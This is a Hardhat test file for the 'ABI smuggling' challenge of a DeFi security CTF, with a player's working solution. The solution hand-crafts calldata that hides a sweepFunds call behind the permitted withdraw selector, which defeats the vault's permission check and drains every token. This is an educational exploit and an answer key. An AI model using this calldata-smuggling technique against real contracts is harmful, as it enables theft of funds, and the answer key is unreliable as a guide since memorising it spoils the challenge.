const { ethers } = require("hardhat");
const { expect } = require("chai");
const { Signer } = require("ethers");

describe("[Challenge] ABI smuggling", function () {
  let deployer, player, recovery;
  let token, vault;

  const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player, recovery] = await ethers.getSigners();

    // Deploy Damn Valuable Token contract
    token = await (
      await ethers.getContractFactory("DamnValuableToken", deployer)
    ).deploy();

    // Deploy Vault
    vault = await (
      await ethers.getContractFactory("SelfAuthorizedVault", deployer)
    ).deploy();
    expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

    // Set permissions
    const deployerPermission = await vault.getActionId(
      "0x85fb709d",
      deployer.address,
      vault.address
    );
    const playerPermission = await vault.getActionId(
      "0xd9caed12",
      player.address,
      vault.address
    );
    await vault.setPermissions([deployerPermission, playerPermission]);
    expect(await vault.permissions(deployerPermission)).to.be.true;
    expect(await vault.permissions(playerPermission)).to.be.true;

    // Make sure Vault is initialized
    expect(await vault.initialized()).to.be.true;

    // Deposit tokens into the vault
    await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

    expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
    expect(await token.balanceOf(player.address)).to.eq(0);

    // Cannot call Vault directly
    await expect(
      vault.sweepFunds(deployer.address, token.address)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
    await expect(
      vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
    ).to.be.revertedWithCustomError(vault, "CallerNotAllowed");
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    /** step 1: Recreate and Verify key function sig */
    let abi = [`function execute(address, bytes)`];
    let iface = new ethers.utils.Interface(abi);
    let sig = iface.getSighash("execute");
    console.log(sig);
    abi = [`function sweepFunds(address, address)`];
    iface = new ethers.utils.Interface(abi);
    sig = iface.getSighash("sweepFunds");
    console.log(sig);
    abi = [`function withdraw(address, address,uint256)`];
    iface = new ethers.utils.Interface(abi);
    sig = iface.getSighash("withdraw");
    console.log(sig);
    /** step 2: prepare nested msg.data; function sweepFunds is nested behind function withdraw */
    abi = ethers.utils.defaultAbiCoder;
    let params1 = "0x1cff79cd";
    let params2 = abi.encode(["address", "uint256"], [vault.address, 100]);
    let params3 = ethers.utils.hexZeroPad("0x0", 32);
    let params4 = "0xd9caed12";
    //Acutal bytes 'actiondata' contents starts here
    let params5 = abi.encode(["uint256"], [68]);
    abi = ["function sweepFunds(address,address)"];
    iface = new ethers.utils.Interface(abi);
    let params6 = iface.encodeFunctionData("sweepFunds", [
      recovery.address,
      token.address,
    ]);
    let params = ethers.utils.hexConcat([
      params1,
      params2,
      params3,
      params4,
      params5,
      params6,
    ]);
    console.log(params);
    /**step 3: execute */
    let tx = {
      from: player.address,
      to: vault.address,
      data: params,
      gasLimit: 3000000,
    };
    await player.sendTransaction(tx);
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
    expect(await token.balanceOf(vault.address)).to.eq(0);
    expect(await token.balanceOf(player.address)).to.eq(0);
    expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
  });
});
